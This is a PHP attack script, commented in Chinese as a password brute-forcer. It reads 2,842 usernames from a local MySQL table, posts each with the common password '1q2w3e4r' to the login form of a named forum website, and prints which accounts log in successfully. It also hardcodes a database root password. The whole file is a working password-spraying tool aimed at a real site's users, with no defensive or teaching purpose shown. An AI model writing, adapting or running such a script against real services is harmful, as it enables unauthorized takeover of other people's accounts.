<?php
//爆破密码
error_reporting(0);//屏蔽notice错误


function _curl($headers,$url,$post_data){
	$curl=curl_init();
	curl_setopt($curl,CURLOPT_URL,$url);
	curl_setopt($curl,CURLOPT_POST,1);
	curl_setopt($curl,CURLOPT_POSTFIELDS,http_build_query($post_data));
	curl_setopt($curl, CURLOPT_HEADER, 1);
	curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($curl,CURLOPT_TIMEOUT,1);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	$res=curl_exec($curl);
	$res=iconv('gbk','utf-8',$res);
	return $res;
	curl_close($curl);
}

function _timeout($headers,$url,$post_data){
	try{
		return _curl($headers,$url,$post_data);
	}
	catch(Exception $e){
		return _timeout($headers,$url,$post_data);
	}

}
//连接数据库
function _mysql($sql){
	$host="localhost";
	$user="root";
	$passwd="wuqianru123.";
	$dbname="test";
	$charset="utf8";
	$link=mysql_connect($host,$user,$passwd);
	mysql_select_db($dbname);
	mysql_set_charset($charset);
	$res=mysql_query($sql);	
	$res=mysql_fetch_row($res);
	return $res;
}


$url="http://www.santongit.com/member.php?mod=logging&action=login&loginsubmit=yes&handlekey=login";
$headers=array('Content-Type'=>'Content-Type: application/x-www-form-urlencoded');

for ($i=0; $i <2842; $i++) { 
	$sql="select username from test limit $i,1;";
	$res=_mysql($sql);
	$username=$res[0];
	$post_data=array('loginfield'=>'username','username'=>$username,'password'=>'1q2w3e4r');
	$result=_timeout($headers,$url,$post_data);
	if ($result) {
		preg_match_all("/个人空间/is", $result, $matches);

		if ($matches[0][0]) {
			echo "success!".$i.$username;
		}
	}
}


?>